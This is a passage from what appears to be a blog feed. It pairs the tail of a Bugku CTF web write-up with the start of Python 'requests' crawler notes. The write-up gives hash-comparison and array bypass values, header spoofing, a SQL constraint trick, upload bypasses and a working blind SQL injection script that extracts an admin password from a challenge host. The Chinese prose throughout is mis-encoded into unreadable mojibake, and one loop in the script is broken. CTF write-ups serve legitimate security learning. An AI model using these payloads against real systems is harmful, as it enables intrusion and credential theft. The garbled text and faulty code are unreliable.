class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5 å¼±æ¯”è¾ƒ 0e ç»•è¿‡ + strcmp å‡½æ•°æ•°ç»„ç»•è¿‡</p><p><code>v1=s878926199a&amp;v2=s155964671a&amp;v3[]=1</code></p><h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><p><code>SQLçº¦æŸæ”»å‡»</code>æ—©æœ‰è€³é—»</p><p>[<a href="https://www.freebuf.com/articles/web/124537.html]">https://www.freebuf.com/articles/web/124537.html]</a></p><p>[<a href="https://www.runoob.com/sql/sql-constraints.html]">https://www.runoob.com/sql/sql-constraints.html]</a></p><p>æ³¨å†Œè´¦å·æ—¶ï¼Œ<code>admin+20ä¸ªç©ºæ ¼</code>è´¦å·æƒé™ç­‰åŒäº<code>admin</code></p><h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><p><code>referer:https://www.google.com</code></p><h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><p>md5 çš„ 0e å¼±æ¯”è¾ƒç¢°æ’ï¼Œä¼ å‚å°±è¡Œ</p><h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><p><code>x-forwarded-for:127.0.0.1</code></p><h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])&amp;(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>sha1æ•°ç»„ç»•è¿‡</p><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><p><code>php://input</code></p><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><p>dirmapæ‰«å‡ºæ¥<code>robots.txt</code>ï¼Œ<code>robots.txt</code>å‘Šè¯‰æˆ‘æœ‰ä¸ª<code>resusl.php</code>ï¼Œ<code>resusl.php</code>å‘Šè¯‰æˆ‘<code>if ($_GET[x]==$password)</code>ï¼Œé¢˜ç›®å‘Šè¯‰æˆ‘æˆ‘å¾—æ˜¯ç®¡ç†å‘˜ï¼Œæ‰€ä»¥<code>$x=admin</code>å³å¯</p><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><p>ç»å…¸æ–‡ä»¶ä¸Šä¼ ç»•è¿‡å§¿åŠ¿<code>multipart/form-data</code>ã€<code> content-type</code>å’Œ<code>php5</code></p><p><code>multipart/form-data</code>ï¼š  éœ€è¦åœ¨è¡¨å•ä¸­è¿›è¡Œæ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œéœ€è¦ä½¿ç”¨è¯¥æ ¼å¼ï¼Œé€šè¿‡è¡¨å•å¯¹æ–‡ä»¶æ ¼å¼å†è¿›è¡Œä¸€æ¬¡åˆ¤æ–­ï¼Œæ˜¯åœ¨åç«¯è¿›è¡Œåˆ¤æ–­ï¼Œåªæ”¯æŒå°å†™å­—ç¬¦ï¼Œé€šè¿‡å¯¹è¯·æ±‚å¤´ä¸­çš„Content-Typeè¿›è¡Œå¤§å°å†™ç»•è¿‡ï¼Œå°†multipart&#x2F;form-dataéšä¾¿å¤§å†™ä¸€ä¸ªå­—æ¯å°±å¯ä»¥äº†</p><p><code>content-type</code>ï¼šæ ‡æ˜ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</p><p><code>php5</code>ï¼šphpçš„è§£ææ¼æ´</p><p><strong>formè¡¨å•çš„enctypeå±æ€§ï¼šè§„å®šäº†formè¡¨å•æ•°æ®åœ¨å‘é€åˆ°æœåŠ¡å™¨æ—¶å€™çš„ç¼–ç æ–¹å¼</strong></p><pre><code>application/x-www-form-urlencodedï¼šé»˜è®¤ç¼–ç æ–¹å¼multipart/form-dataï¼šæŒ‡å®šä¼ è¾“æ•°æ®ä¸ºäºŒè¿›åˆ¶æ•°æ®ï¼Œä¾‹å¦‚å›¾ç‰‡ã€mp3ã€æ–‡ä»¶text/plainï¼šçº¯æ–‡æœ¬çš„ä¼ è¾“ã€‚ç©ºæ ¼è½¬æ¢ä¸ºâ€œ+â€ï¼Œä½†ä¸æ”¯æŒç‰¹æ®Šå­—ç¬¦ç¼–ç ã€‚</code></pre><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><p>è§£é‡Š payloadï¼š</p><p><strong><code>admin&#39;^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#</code></strong></p><ol><li><p>ä¸ºäº†ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ï¼Œç”¨æ‹¬å·éš”å¼€ï¼Œè¿‡æ»¤äº†ç­‰å·ï¼Œç”¨ä¸ç­‰å· &lt;&gt;ä»£æ›¿ï¼Œåªè¦æ˜¯å¸ƒå°”å€¼å°±å¯ä»¥ã€‚</p></li><li><p>mid()å‡½æ•°å’Œsubstring()ä¸€æ ·ï¼Œä¸€ç§å†™æ³•æ˜¯mid(xxx,1,1)ï¼Œå¦ä¸€ç§æ˜¯mid(xxx,from 1 for 1)ä½†æ˜¯è¿™é‡Œè¿‡æ»¤äº†forå’Œé€—å·ï¼Œé‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>å› æ­¤ï¼Œè¿™é‡Œç”¨åˆ°äº†ascii()å–asciiç å€¼çš„å‡½æ•°ï¼Œå¦‚æœä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²é‚£ä¹ˆå°±ä¼šå–ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å­—ç¬¦çš„asciiç å€¼ï¼Œè¿™å°±æœ‰äº†forçš„ä½œç”¨ï¼Œå¹¶ä¸”mid()å‡½æ•°æ˜¯å¯ä»¥åªå†™fromçš„è¡¨ç¤ºä»ç¬¬å‡ ä½å¾€åçš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å°†å–å‡ºçš„å­—ç¬¦ä¸²åœ¨ä¼ å…¥ascii()ä¸­å–ç¬¬ä¸€ä½ï¼Œå°±å®Œæˆäº†å¯¹å•ä¸ªå­—ç¬¦çš„æå–ã€‚</p></li><li><p>æ¯ä¸ªå­—ç¬¦çš„asciiç åˆ¤æ–­ï¼Œæ˜¯å¦ä¸ç­‰äºç»™å®šçš„æ•°å­—ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªå¸ƒå°”å€¼(0æˆ–1)å†ä¸ç»“å°¾çš„0è¿›è¡Œè¿ç®—ã€‚</p><p>å¦‚æœæ•°æ®åº“åçš„ç¬¬ä¸€ä½çš„asciiç å€¼ä¸æ˜¯97ï¼Œwhereæ¡ä»¶æ˜¯username&#x3D;â€™adminâ€™^1^0</p><p>è¿”å›å€¼æ˜¯username does not exist!</p><p>å¦‚æœæ•°æ®åº“åçš„ç¬¬ä¸€ä½çš„asciiç å€¼æ˜¯97ï¼Œwhereæ¡ä»¶æ˜¯username&#x3D;â€™adminâ€™^0^0</p><p>è¿”å›å€¼ä¼šæ˜¯password error!</p><p>è¿™å°±æ„æˆäº†å¸ƒå°”æŠ¥é”™æ³¨å…¥ã€‚</p></li><li><p>æœ€å^0çš„å¦™ç”¨ï¼ å› ä¸ºâ€™adminâ€™^0^0å’Œâ€™adminâ€™^1^1æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ åè€…æ¥çœ‹å‰è€…æˆç«‹æ—¶çš„æƒ…å†µã€‚ å› ä¸ºè¿™é‡Œå³ä½¿æ˜¯è¯­æ³•é”™è¯¯ä¹Ÿä¸ä¼šæŠ¥é”™ï¼Œæœ‰å¯èƒ½ä½ è¾“å…¥çš„è¯­å¥å°±ä¸å¯èƒ½æˆç«‹ï¼Œä½†ä½ ä¹Ÿæ— æ³•çŸ¥é“ã€‚</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">str_all=<span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125;+-*/=&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:18157/&quot;</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database</span>():</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_all:</span><br><span class="line">            payload=<span class="string">&quot;admin&#x27;^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">ord</span>(j))</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            s=r.post(url,data)</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> s.text:</span><br><span class="line">                result+=j</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password</span>():</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_all:</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27;^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i+<span class="number">1</span>),<span class="built_in">ord</span>(j))</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            s=r.post(url,data)</span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> s.text:</span><br><span class="line">                result+=j</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;**************************&#x27;</span>,result)</span><br><span class="line">        <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#database()</span></span><br><span class="line">password()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku&amp;Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonçˆ¬è™«æ…•è¯¾å­¦ä¹ ç¬”è®°</title>
      <link href="/posts/13919/"/>
      <url>/posts/13919/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢<br>ä¸çŸ¥é“å†™å•¥å…¶å®è¯´å®è¯</p></blockquote><h1 id="ç½‘ç»œçˆ¬è™«ä¹‹è§„åˆ™"><a href="#ç½‘ç»œçˆ¬è™«ä¹‹è§„åˆ™" class="headerlink" title="ç½‘ç»œçˆ¬è™«ä¹‹è§„åˆ™"></a>ç½‘ç»œçˆ¬è™«ä¹‹è§„åˆ™</h1><h2 id="å®‰è£…requestsåº“"><a href="#å®‰è£…requestsåº“" class="headerlink" title="å®‰è£…requestsåº“"></a>å®‰è£…requestsåº“</h2><p>cmd å‘½ä»¤è¡Œæ‰“å¼€</p><p>è¾“å…¥<code>pip3 install requests</code>ï¼Œç­‰å¾…å³å¯</p><p>ç®€å•æµ‹è¯•ï¼Œçˆ¬ä¸€ä¸‹<code>bkjw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&quot;http://172.16.13.22/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br><span class="line">r.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="number">200</span></span><br><span class="line"></span><br><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">if</span> (location.href.toLowerCase().lastIndexOf(<span class="string">&#x27;maindesktop&#x27;</span>, <span class="number">0</span>) &gt; <span class="number">0</span>)</span><br><span class="line">        top.location.href = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">&lt;/script&gt;    </span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;/extjs/resources/css/ext-all-gray.css&quot;</span> /&gt;</span><br><span class="line">    &lt;!--å¼•å…¥è‡ªå®šä¹‰CSS--&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;/Content/css/iconCss.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;/extjs/Desktop/css/desktop.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;/Content/style.css&quot;</span> /&gt;</span><br><span class="line">    &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;/extjs/ext-all.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;/extjs/locale/ext-lang-zh_CN.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;/extjs/Extensions/CustomValidate.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;/extjs/Extensions/Util.js?v=0.1&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;/extjs/Desktop/login.js?v=0.1&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="requestsåº“7ä¸ªä¸»è¦æ–¹æ³•"><a href="#requestsåº“7ä¸ªä¸»è¦æ–¹æ³•" class="headerlink" title="requestsåº“7ä¸ªä¸»è¦æ–¹æ³•"></a>requestsåº“7ä¸ªä¸»è¦æ–¹æ³•</h2><table><thead><tr><th align="center">æ–¹æ³•</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">requests.request()</td><td align="center">æ„é€ ä¸€ä¸ªè¯·æ±‚ï¼Œæ”¯æ’‘ä»¥ä¸‹å„æ–¹æ³•çš„åŸºç¡€æ–¹æ³•</td></tr><tr><td align="center">requests.post()</td><td align="center">å‘ç½‘é¡µæäº¤postè¯·æ±‚</td></tr><tr><td align="center">requests.head()</td><td align="center">è·å–ç½‘é¡µå¤´ä¿¡æ¯</td></tr><tr><td align="center">requests.put()</td><td align="center">å‘ç½‘é¡µæäº¤putè¯·æ±‚</td></tr><tr><td align="center">requests.patch()</td><td align="center">å‘ç½‘é¡µæäº¤å±€éƒ¨ä¿®æ”¹è¯·æ±‚</td></tr><tr><td align="center">requests.delete()</td><td align="center">å‘ç½‘é¡µæäº¤åˆ é™¤è¯·æ±‚</td></tr><tr><td align="center">requests.get()</td><td align="center">å‘ç½‘é¡µæäº¤getè¯·æ±‚</td></tr></tbody></table><blockquote><p>requestsåº“å…¶å®åªæœ‰ä¸€ä¸ªæ–¹æ³•â€”â€”<code>request()</code>æ–¹æ³•ï¼Œå…¶ä»–å…­ç§æ–¹æ³•éƒ½æ˜¯å¯¹<code>request()</code>æ–¹æ³•çš„å°è£…</p></blockquote><h2 id="requestsåº“å¼‚å¸¸å¤„ç†"><a href="#requestsåº“å¼‚å¸¸å¤„ç†" class="headerlink" title="requestsåº“å¼‚å¸¸å¤„ç†"></a>requestsåº“å¼‚å¸¸å¤„ç†</h2><table><thead><tr><th align="center">å¼‚å¸¸</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">requests.ConnectionError</td><td align="center">ç½‘ç»œè¿æ¥é”™è¯¯å¼‚å¸¸ï¼Œå¦‚DNSæŸ¥è¯¢å¤±è´¥ã€æ‹’ç»è¿æ¥</td></tr><tr><td align="center">requests.HTTPError</td><td align="center">HTTPé”™è¯¯å¼‚å¸¸</td></tr><tr><td align="center">requests.URLRequired</td><td align="center">URLç¼ºå¤±</td></tr><tr><td align="center">requests.TooManyRedirects</td><td align="center">è¶…è¿‡æœ€å¤§é‡å®šå‘æ¬¡æ•°ï¼Œäº§ç”Ÿé‡å®šå‘å¼‚å¸¸</td></tr><tr><td align="center">requests.ConnectTimeout</td><td align="center">è¿æ¥è¿œç¨‹æœåŠ¡å™¨è¶…æ—¶å¼‚å¸¸</td></tr><tr><td align="center">requests.Timeout</td><td align="center">è¯·æ±‚URLè¶…æ—¶ï¼Œäº§ç”Ÿè¶…æ—¶å¼‚å¸¸</td></tr></tbody></table><h2 id="responseå¯¹è±¡çš„å¸¸ç”¨å±æ€§å’Œæ–¹æ³•"><a href="#responseå¯¹è±¡çš„å¸¸ç”¨å±æ€§å’Œæ–¹æ³•" class="headerlink" title="responseå¯¹è±¡çš„å¸¸ç”¨å±æ€§å’Œæ–¹æ³•"></a>responseå¯¹è±¡çš„å¸¸ç”¨å±æ€§å’Œæ–¹æ³•</h2><blockquote><p>**dir()**ä¸€ä¸ªresponseå¯¹è±¡å¯ä»¥çœ‹åˆ°å®ƒçš„å±æ€§å’Œæ–¹æ³•</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;__attrs__&#x27;</span>, <span class="string">&#x27;__bool__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__enter__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__exit__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__getstate__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__nonzero__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__setstate__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>, <span class="string">&#x27;_content&#x27;</span>, <span class="string">&#x27;_content_consumed&#x27;</span>, <span class="string">&#x27;_next&#x27;</span>, <span class="string">&#x27;apparent_encoding&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>, <span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;cookies&#x27;</span>, <span class="string">&#x27;elapsed&#x27;</span>, <span class="string">&#x27;encoding&#x27;</span>, <span class="string">&#x27;headers&#x27;</span>, <span class="string">&#x27;history&#x27;</span>, <span class="string">&#x27;is_permanent_redirect&#x27;</span>, <span class="string">&#x27;is_redirect&#x27;</span>, <span class="string">&#x27;iter_content&#x27;</span>, <span class="string">&#x27;iter_lines&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;links&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;ok&#x27;</span>, <span class="string">&#x27;raise_for_status&#x27;</span>, <span class="string">&#x27;raw&#x27;</span>, <span class="string">&#x27;reason&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;status_code&#x27;</span>, <span class="string">&#x27;text&#x27;</span>, <span class="string">&#x27;url&#x27;</span>]</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨çš„å±æ€§</p><table><thead><tr><th align="center">å±æ€§</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">r.headers</td><td align="center">HTTPå“åº”å¤´</td></tr><tr><td align="center">r.status_code</td><td align="center">HTTPè¯·æ±‚çš„è¿”å›çŠ¶æ€ï¼Œ200è¡¨ç¤ºè¿æ¥æˆåŠŸï¼Œ404è¡¨ç¤ºå¤±è´¥</td></tr><tr><td align="center">r.text</td><td align="center">HTTPå“åº”å†…å®¹çš„å­—ç¬¦ä¸²å½¢å¼ï¼Œå³urlå¯¹åº”çš„é¡µé¢å†…å®¹</td></tr><tr><td align="center">r.encoding</td><td align="center">ä»HTTP headerä¸­çŒœæµ‹çš„å“åº”å†…å®¹ç¼–ç æ–¹å¼</td></tr><tr><td align="center">r.apparent_encoding</td><td align="center">ä»å†…å®¹ä¸­åˆ†æå‡ºçš„å“åº”å†…å®¹ç¼–ç æ–¹å¼ï¼ˆå¤‡é€‰ç¼–ç æ–¹å¼ï¼‰</td></tr><tr><td align="center">r.content</td><td align="center">HTTPå“åº”å†…å®¹çš„äºŒè¿›åˆ¶å½¢å¼</td></tr><tr><td align="center">r.ok</td><td align="center">HTTPè¯·æ±‚æˆåŠŸæ²¡ï¼Œè¿”å›Trueæˆ–False</td></tr></tbody></table><blockquote><p><code>r.encoding</code>ï¼šå¦‚æœ header ä¸­ä¸å­˜åœ¨ <code>charset</code>ï¼Œåˆ™è®¤ä¸ºç¼–ç ä¸º<code>ISO-8859-1</code>ï¼Œä¸å¤ªå‡†ç¡®</p><p><code>r.apparent_encoding</code>ï¼šå¤‡é€‰ç¼–ç ï¼Œä»ç½‘é¡µçš„å†…å®¹åˆ†æç¼–ç æ–¹å¼ï¼Œä¸€èˆ¬å‡†ç¡®</p><blockquote><p>å¸¸ç”¨ <code>r.encodint = r.apparent_encoding</code></p></blockquote></blockquote><h2 id="é€šç”¨ä»£ç æ¡†æ¶"><a href="#é€šç”¨ä»£ç æ¡†æ¶" class="headerlink" title="é€šç”¨ä»£ç æ¡†æ¶"></a>é€šç”¨ä»£ç æ¡†æ¶</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@Time : 2020/12/10</span></span><br><span class="line"><span class="string">@Author : C1everF0x</span></span><br><span class="line"><span class="string">@File : demo.py</span></span><br><span class="line"><span class="string">@Description : </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getHTMLText</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        